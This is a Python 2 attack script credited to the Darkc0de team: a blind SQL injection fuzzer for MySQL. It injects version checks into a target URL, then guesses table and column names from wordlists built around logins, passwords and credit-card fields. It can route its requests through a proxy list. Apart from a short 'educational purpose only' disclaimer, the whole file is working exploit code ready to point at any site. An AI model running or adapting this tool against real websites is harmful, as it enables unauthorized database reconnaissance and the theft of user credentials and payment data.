#!/usr/bin/python
# MySQL Blind Table and Column Fuzzer
# This script will fuzz table and columns names on MySQL v4 v5
# via blind sql injection and put it in a nice reader friendly output

# String is the text in the page that comes back when 1=1
# same as in sqlmap.py

# Share the Knowledge!

# Darkc0de Team 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, P47r1ck, Tarsian, c0mr@d, reverenddigitalx, Baltazar
# and the rest of the Darkc0de members

# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# Intended for authorized Web Application Pen Testing!

# BE WARNED, THIS TOOL IS VERY LOUD.. 

#Fill in the tables you want tested here.
fuzz_tables = ["user","users","username","usernames","mysql.user","orders","member","members","admin","administrator","administrators","login","logins","logon","jos_users","jos_contact_details","userrights","account","superuser","control","usercontrol","author","autore","artikel","newsletter","tb_user","tb_users","tb_username","tb_usernames","tb_admin","tb_administrator","tb_member","tb_members","tb_login","perdorues","korisnici","webadmin","webadmins","webuser","webusers","webmaster","webmasters","customer","customers","sysuser","sysusers","sysadmin","sysadmins","memberlist","tbluser","tbl_user","tbl_users","a_admin","x_admin","m_admin","adminuser","admin_user","adm","userinfo","user_info","admin_userinfo","userlist","user_list","user_admin","order","user_login","admin_user","admin_login","login_user","login_users","login_admin","login_admins","sitelogin","site_login","sitelogins","site_logins","SiteLogin","Site_Login","User","Users","Admin","Admins","Login","Logins","adminrights","news","perdoruesit"] 
#Fill in the columns you want tested here.
fuzz_columns = ["user","username","password","passwd","pass","cc_number","id","email","emri","fjalekalimi","pwd","user_name","customers_email_address","customers_password","user_password","name","user_pass","admin_user","admin_password","admin_pass","usern","user_n","users","login","logins","login_user","login_admin","login_username","user_username","user_login","auid","apwd","adminid","admin_id","adminuser","admin_user","adminuserid","admin_userid","adminusername","admin_username","adminname","admin_name","usr","usr_n","usrname","usr_name","usrpass","usr_pass","usrnam","nc","uid","userid","user_id","myusername","mail","emni","logohu","punonjes","kpro_user","wp_users","emniplote","perdoruesi","perdorimi","punetoret","logini","llogaria","fjalekalimin","kodi","emer","ime","korisnik","korisnici","user1","administrator","administrator_name","mem_login","login_password","login_pass","login_passwd","login_pwd","sifra","lozinka","psw","pass1word","pass_word","passw","pass_w","user_passwd","userpass","userpassword","userpwd","user_pwd","useradmin","user_admin","mypassword","passwrd","admin_pwd","admin_pass","admin_passwd","mem_password","memlogin","userid","admin_id","adminid","e_mail","usrn","u_name","uname","mempassword","mem_pass","mem_passwd","mem_pwd","p_word","pword","p_assword","myusername","myname","my_username","my_name","my_password","my_email","cvvnumber","order_payment","card_number","is_admin"] 
  
import urllib, sys, re, socket, httplib, urllib2, time

print "\n|---------------------------------------------------------------|"
print "| rsauron[@]gmail[dot]com                                 v2.0  |"
print "|   7/2008      blindfuzz.py                                    |"
print "|      - MySQL v4+ Blind SQL Injection Table & Column Fuzzer    |"
print "|                                               darkc0de.com    |"
print "|---------------------------------------------------------------|\n"

#Validate input parameters
if len(sys.argv) < 2:
	print "\nUsage: ./blindfuzz.py -u <site> -s <string> -p <proxy/proxyfile> -o <output file>"
	print "\nEx: ./blindfuzz.py -u \"www.site.com/product_id?id=473\" -s \"textinpage\" -p 127.0.0.1:80 -o fuzz.txt\n"
	sys.exit(1)

#define varablies
site = ""
string = ""
dbt = "blindfuzz.txt"
proxy = "None"
count = 0
gets = 0

#Check args
for arg in sys.argv:
    if arg == "-u":
        site = sys.argv[count+1]
    elif arg == "-s":
        string = sys.argv[count+1]
    elif arg == "-p":
	proxy = sys.argv[count+1]
    elif arg == "-o":
        dbt = sys.argv[count+1]
    count+=1

#Error Checking
if site == "":
    print "\n[-] Must include -u flag followed by site.\n" 
    sys.exit(1)
if string == "":
    print "\n[-] Must include -s flag followed by intext string.\n"
if proxy != "None":
    if len(proxy.split(".")) == 2:
	    proxy = open(proxy, "r").read()
    if proxy.endswith("\n"):
	    proxy = proxy.rstrip("\n")
    proxy = proxy.split("\n")
if site[:7] != "http://": 
	site = "http://"+site

#Title write
file = open(dbt, "a")
file.write("\n\n|---------------------------------------------------------------|")
file.write("\n| rsauron[@]gmail[dot]com                                 v2.0  |")
file.write("\n|   7/2008      blindfuzz.py                                    |")
file.write("\n|      - MySQL v4+ Blind SQL Injection Table & Column Fuzzer    |")
file.write("\n|                                               darkc0de.com    |")
file.write("\n|---------------------------------------------------------------|\n")
print "[+] URL:",site
file.write("\n[+] URL:"+site+"\n")	

#Build proxy list
socket.setdefaulttimeout(10)
proxy_list = []
if proxy != "None":
    file.write("[+] Building Proxy List...")
    print "[+] Building Proxy List..."
    for p in proxy:
	try:
            proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
            opener = urllib2.build_opener(proxy_handler)
	    opener.open("http://www.google.com")
	    proxy_list.append(urllib2.build_opener(proxy_handler))
	    file.write("\n\tProxy:"+p+"- Success")
	    print "\tProxy:",p,"- Success"
	except:
	    file.write("\n\tProxy:"+p+"- Failed")
	    print "\tProxy:",p,"- Failed"
	    pass
    if len(proxy_list) == 0:
	print "[-] All proxies have failed. App Exiting"
	file.write("\n[-] All proxies have failed. App Exiting\n")
	sys.exit(1) 
    print "[+] Proxy List Complete"
    file.write("[+] Proxy List Complete")
else:
    print "[-] Proxy Not Given"
    file.write("[+] Proxy Not Given")
    proxy_list.append(urllib2.build_opener())

#check version
print "[+] Gathering MySQL Server Configuration..."
file.write("\n[+] Gathering MySQL Server Configuration...")
proxy_num = 0
proxy_len = len(proxy_list)
ser_ver = 3
while 1:
        try:
                head_URL = site+"+and+substring(@@version,1,1)="+str(ser_ver)
                proxy_num+=1
                source = proxy_list[proxy_num % proxy_len].open(head_URL).read()
                match = re.findall(string,source)
                if len(match) >= 1:
                        print "\t[+] MySQL >= v"+str(ser_ver)+".0.0 found!"
                        file.write("\n\t[+] MySQL >= v"+str(ser_ver)+".0.0 found!")
                        if int(ser_ver) <=3:
                                print "\t[-] This tool only works on MySQL >= v4 and above!"
                                file.write("\n\t[-] This tool only works on MySQL >= v4 and above!\n")
                                print "[-] Done"
                                file.write("[-] Done\n")
                                sys.exit(1)
                        break
                if int(ser_ver) > 7:
                        print "\t[-] Not a MySQL server or the string your using is not being found!\n"
                        file.write("\n\t[-] Not a MySQL server or the string your using is not being found!\n")
                        sys.exit(1)
                ser_ver+=1
                gets+=1
        except (KeyboardInterrupt, SystemExit):
        	raise
	except:
                break

#Lets Fuzz
print "\n[%s] StartTime" % time.strftime("%X")
file.write("\n\n[%s] StartTime" % time.strftime("%X"))
print "[+] Fuzzing Tables..."
file.write("\n[+] Fuzzing Tables...")
fuzz_TABLE_url = site+"+and+(SELECT+1+from+TABLE+limit+0,1)=1"
for table in fuzz_tables: 
	try:
		proxy_num+=1
                gets+=1
		table_URL = fuzz_TABLE_url.replace("TABLE",table)
		source = proxy_list[proxy_num % proxy_len].open(table_URL).read()
		match = re.findall(string,source)
		if len(match) >= 1:
			print "\n[Table]:",table
			file.write("\n\n[Table]:"+table)
			fuzz_COLUMN_url = site+"+and+(SELECT+substring(concat(1,COLUMN),1,1)+from+"+table+"+limit+0,1)=1"
			for column in fuzz_columns:
				try:
					proxy_num+=1
                                        gets+=1
					column_URL = fuzz_COLUMN_url.replace("COLUMN",column)
					source = proxy_list[proxy_num % proxy_len].open(column_URL).read()
					match = re.findall(string,source)
					if len(match) >= 1:
						print "[Column]:",column
						file.write("\n[Column]:"+column)	
				except (KeyboardInterrupt, SystemExit):
					raise
				except:
					pass	
	except (KeyboardInterrupt, SystemExit):
		raise
	except:
                pass
print "\n[%s] EndTime" % time.strftime("%X")
print "[-] Total URL Requests",gets
file.write("\n\n[%s] EndTime" % time.strftime("%X"))
file.write("\n[-] Total URL Requests "+str(gets))
print "[-] Done\n"
file.write("\n[-] Done\n")
print "Don't forget to check", dbt,"\n"
file.close()
